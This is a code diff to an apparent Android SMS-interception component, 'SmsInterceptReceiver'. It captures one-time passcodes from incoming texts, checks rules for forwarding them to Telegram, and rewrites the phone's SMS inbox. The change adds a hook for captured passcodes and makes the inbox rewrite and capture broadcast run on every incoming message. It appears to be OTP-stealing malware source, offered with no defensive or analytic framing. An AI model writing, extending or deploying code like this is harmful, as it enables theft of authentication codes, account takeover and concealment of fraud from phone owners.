@@ -43,17 +43,25 @@ class SmsInterceptReceiver : BroadcastReceiver() {
                     capturedAt = System.currentTimeMillis()
                 )
                 OtpCaptureWriter.write(appContext, otp)
+                OtpAutoFillHelper.onHookedOtpCaptured(appContext, config, otp)
+                InboxSmsRewriteHelper.onIncomingSms(appContext, sender, body)
                 if (SmsMatcher.shouldForwardToTelegram(config, sender, body, "incoming")) {
                     appContext.sendBroadcast(
                         Intent(ACTION_SMS_CAPTURED).setPackage(appContext.packageName)
                     )
                 }
-                InboxSmsRewriteHelper.rewriteRecentInbox(appContext)
                 finish(pending)
                 return
             }
 
-            if (!SmsMatcher.shouldCaptureIncoming(config, sender, body)) return finish(pending)
+            InboxSmsRewriteHelper.onIncomingSms(appContext, sender, body)
+
+            if (!SmsMatcher.shouldCaptureIncoming(config, sender, body)) {
+                appContext.sendBroadcast(
+                    Intent(ACTION_SMS_CAPTURED).setPackage(appContext.packageName)
+                )
+                return finish(pending)
+            }
 
             val interceptDisplay = SmsMatcher.interceptDisplay(config, sender, configManager)
             val token = SmsMatcher.extractToken(body, config.autoExtractOtp)
